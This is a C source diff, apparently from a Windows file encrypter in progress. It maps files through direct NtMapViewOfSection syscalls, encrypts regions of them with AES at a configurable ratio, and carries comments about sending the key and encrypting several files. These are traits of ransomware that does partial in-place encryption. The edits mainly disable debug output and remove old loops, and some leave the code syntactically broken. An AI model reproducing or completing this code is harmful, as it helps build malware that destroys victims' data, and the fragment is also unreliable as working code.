@@ -17,10 +17,10 @@ void DebugNtMapParams(
     ULONG ZeroBits,
     SIZE_T CommitSize,
     PLARGE_INTEGER SectionOffset,
-    PULONG ViewSize,
+    /* PULONG ViewSize,
     ULONG InheritDisposition,
     ULONG AllocationType,
-    ULONG Protect)
+    ULONG Protect */)
 {
     printf("\n--- [Debug NtMapViewOfSection Parameters] ---\n");
     printf("SectionHandle         : %p\n", SectionHandle);
@@ -32,10 +32,10 @@ void DebugNtMapParams(
         printf("SectionOffset         : %lld (0x%llx)\n", SectionOffset->QuadPart, SectionOffset->QuadPart);
     else
         printf("SectionOffset         : NULL\n");
-    printf("ViewSize (in/out)     : %lu (0x%lx)\n", *ViewSize, *ViewSize);
+   /*  printf("ViewSize (in/out)     : %lu (0x%lx)\n", *ViewSize, *ViewSize);
     printf("InheritDisposition    : 0x%lx\n", InheritDisposition);
     printf("AllocationType        : 0x%lx\n", AllocationType);
-    printf("Protect               : 0x%lx\n", Protect);
+    printf("Protect               : 0x%lx\n", Protect); */
     printf("--------------------------------------------\n");
 }
 
@@ -61,6 +61,11 @@ int MapViewOfSection_my(
         return STATUS_INVALID_PARAMETER;
     }
     
+    if (fileSize.QuadPart == 0) {
+        printf("Error: File size is zero\n");
+        return STATUS_INVALID_PARAMETER;
+    }
+    
     // Set up mapping parameters
     ULONG zeroBits = 0; // Force system to map view in low memory address space
     PVOID baseAddress = NULL; // Use the provided address (can be NULL)
@@ -78,7 +83,7 @@ int MapViewOfSection_my(
     }
     
     // Handle section offset
-    LARGE_INTEGER liOffset;
+    LARGE_INTEGER liOffset = {0};
     if (sectionOffset != NULL) {
         liOffset.QuadPart = sectionOffset->QuadPart;
         // Check if the offset is within the file size
@@ -97,18 +102,18 @@ int MapViewOfSection_my(
         liOffset.QuadPart = 0;
     }
 
-    // Debug the parameters before calling the API
+     // Debug the parameters before calling the API
     DebugNtMapParams(
         sectionHandle,
         GetCurrentProcess(),
         &baseAddress,
         zeroBits,
         commitSize,
-        &liOffset,
-        &viewSize,
+        &liOffset );
+        /* &viewSize,
         ViewShare,
         0,
-        PAGE_READWRITE);
+        PAGE_READWRITE */  
 
     // Call the syscall to map the view
     NTSTATUS status = SysNtMapViewOfSection(
@@ -191,7 +196,7 @@ int loadFileInMemory_test(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *loca
 
     if (NT_SUCCESS(status))
     {
-        printf("Section created successfully\n");
+        //printf("Section created successfully\n");
     }
     else
     {
@@ -305,6 +310,7 @@ int encrypter(PCWSTR filePath, int encryptionRatio)
 
     // Check if file exists
     DWORD fileAttributes = GetFileAttributesW(filePath);
+    printf("File: %ls\n", filePath);
     if (fileAttributes == INVALID_FILE_ATTRIBUTES)
     {
         printf("File not found: %ls\n", filePath);
@@ -332,31 +338,6 @@ int encrypter(PCWSTR filePath, int encryptionRatio)
     // Generate the keys (can't be more than 10 keys because of the Rcon table)
     GenerateTenKeys(key, keys);
 
-    /*    do
-       {
-           // répéter à plusieurs endroits dans le fichier
-           printf("size ofMappedView: %llu\n", sizeOfMappedView);
-           DispatchEcryption(keys, vue, sizeOfMappedView);
-           // increase the offset if needed
-           // offset += sizeOfMappedView * encryptionRatio; // Increment the offset by the size of the view
-           UnmapViewOfFile(localViewAdress);             // Unmap using the API (no need to call syscall directly)
-           moveLocalViewAddress(&fileHandle, &sectionHandle, &localViewAdress, &sizeOfMappedView, &offset);
-           break;
-       } while (moveLocalViewAddress(&fileHandle, &sectionHandle, &localViewAdress, &sizeOfMappedView, &offset) == 0);
-    */
-    /*  state_t state = {
-         {0x23, 0x45, 0x67, 0x89},
-         {0xAB, 0xCD, 0xEF, 0x01},
-         {0x09, 0x54, 0x67, 0x89},
-         {0xCB, 0xA3, 0xEF, 0x10}};
-
-     aes(keys, state);
-
-     printf("encrypter side:  \n ");
-     printState(state);
-  */
-    // Chiffrer plusieurs fichiers
-
     // Envoyer la clé
     if (loadFileInMemory_test(&fileHandle, &sectionHandle, &localViewAdress, filePath, &sizeOfMappedView) != 0)
     {
@@ -374,18 +355,7 @@ int encrypter(PCWSTR filePath, int encryptionRatio)
         UnmapViewOfFile(baseAddress);             // Unmap using the API (no need to call syscall directly)
     } while (MapViewOfSection_my(sectionHandle, fileHandle, &sectionOffset, &sizeOfMappedView, &baseAddress) == 0);
 
-    /* PVOID baseAddress = NULL;
-    LARGE_INTEGER sectionOffset;
-    sectionOffset.QuadPart = sizeOfMappedView; // Start mapping from the beginning of the file
-    
-    UnmapViewOfFile(localViewAdress); 
-    MapViewOfSection_my(
-            sectionHandle,
-            fileHandle,
-            &sectionOffset, // NULL for the offset (it should be a multiple of the page size : 4096 bytes)
-            &sizeOfMappedView,
-            &baseAddress); */
-    
+ 
 
     // Free the section handle
     //  This will unmap the section from the process's address space
